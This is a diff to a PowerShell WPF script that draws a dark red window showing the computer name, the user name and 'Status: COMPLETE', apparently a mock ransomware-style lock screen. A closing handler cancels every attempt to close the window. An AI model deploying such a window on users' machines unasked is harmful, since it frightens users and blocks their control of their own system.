@@ -13,12 +13,23 @@ $w.WindowStartupLocation = [System.Windows.WindowStartupLocation]::CenterScreen
 $g = New-Object System.Windows.Controls.Grid
 $g.Background = [System.Windows.Media.Brushes]::DarkRed
 
+$title = New-Object System.Windows.Controls.TextBlock
+$title.Text = "test`n`nComputer Name: $env:COMPUTERNAME`nUser: $env:USERNAME`nStatus: COMPLETE"
+$title.Foreground = [System.Windows.Media.Brushes]::White
+$title.FontFamily = 'Courier New'
+$title.FontSize = 12
+$title.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Left
+$title.VerticalAlignment = [System.Windows.VerticalAlignment]::Top
+$title.Margin = '0,12,0,0'
+$title.TextWrapping = [System.Windows.TextWrapping]::Wrap
+
 $b = New-Object System.Windows.Controls.Border
 $b.Height = 12
-$b.Margin = '0,12,0,0'
+$b.Margin = '0,25,0,0'
 $b.Background = [System.Windows.Media.Brushes]::Black
 $b.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Stretch
 $b.VerticalAlignment = [System.Windows.VerticalAlignment]::Top
+
 
 $t = New-Object System.Windows.Controls.TextBlock
 $t.Text = "test`n`nComputer Name: $env:COMPUTERNAME`nUser: $env:USERNAME`nStatus: COMPLETE"
@@ -31,9 +42,10 @@ $t.TextWrapping = [System.Windows.TextWrapping]::Wrap
 
 $null = $g.Children.Add($t)
 $null = $g.Children.Add($b)
+$null = $g.Children.Add($title)
 $w.Content = $g
 
-# Optional: ignore normal close button clicks
+
 $w.Add_Closing({ param($s,$e) $e.Cancel = $true })
 
 $null = $w.ShowDialog()
